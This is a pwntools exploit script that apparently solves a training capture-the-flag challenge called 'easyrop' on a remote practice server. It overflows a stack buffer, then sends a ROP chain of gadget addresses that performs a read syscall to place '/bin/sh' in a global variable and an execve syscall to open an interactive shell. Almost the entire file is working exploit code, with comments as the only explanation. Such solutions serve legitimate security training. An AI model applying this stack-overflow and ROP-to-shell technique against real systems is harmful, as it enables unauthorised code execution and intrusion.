from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	r = process("./easyrop")
	gdb.attach(r, """
	c
	""")
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 2015)


#fill the space of the buffer of 48 bytes on the stack (24) + overflow the ebp (4)
for index in range(28):
    payload = b"A" * 4
    r.send(payload)

print("[*]Buffer filled and EBP overwritten")

setter = 0x4001c2 #address of ROPgadget for  pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
global_variable = 0x600370
syscall = 0x4001b3 #0x4001b3 syscall with nop ; pop rbp ; ret #0x400168 syscall without ret
print("[*]Setter gadget: %#x" % setter)
print("[*]Syscall gadget: %#x" % syscall)
print("[*]Global variable address: %#x" % global_variable)

#MULTISTAGE SOLUTION TO WRITE INTO THE GLOBAL VARIABLE

#START READ
#put the cleaner/setter ROP gadget (we want to write in global var so we need a read)
payload = p32(setter)
r.send(payload)
time.sleep(0.1)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#rdi
for index in range(4):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#rsi 0x600370
payload = p32(global_variable) #Address of global variable
r.send(payload)
time.sleep(0.1)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#rdx
payload = p32(0x8)
r.send(payload)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)
    
#rax (0x00 for read)
for index in range(4):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#put the syscall ROP gadget
payload = p32(syscall) #address of ROPgadget for syscall
r.send(payload)
time.sleep(0.1)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#END READ

#fill gadget pop rbp
for index in range(4):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#START EXECVE
#put the cleaner/setter ROP gadget (we prepare for the syscall to binsh)
payload = p32(setter)
r.send(payload)
time.sleep(0.1)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#rdi
payload = p32(global_variable) #address where binsh will be
r.send(payload)
time.sleep(0.1)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#rsi
for index in range(4):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#rdx
for index in range(4):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#rax
payload = p32(0x3b)
r.send(payload)
time.sleep(0.1)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

""" #DO NOT PUT THIS because it is not needed (no ebp anymore)
#new random ebp
for index in range(4):
    payload = b"A" * 4
    r.send(payload)
    time.sleep(0.1)
"""

#put the syscall ROP gadget
payload = p32(syscall) #address of ROPgadget for syscall
r.send(payload)
time.sleep(0.1)
for index in range(3):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

#END EXECVE

#fill gadget rbp
for index in range(4):
    payload = b"\x00" * 4
    r.send(payload)
    time.sleep(0.1)

input("wait")

#exit the while loop
for index in range(2):
    payload = b"\x08"
    r.send(payload)
    time.sleep(0.1)

#write /bin/sh in global var directly (we called our read so no constraint on the length)
r.send(b"/bin/sh\x00")
time.sleep(0.1)
payload = b"\x00"
r.send(payload)

r.interactive()

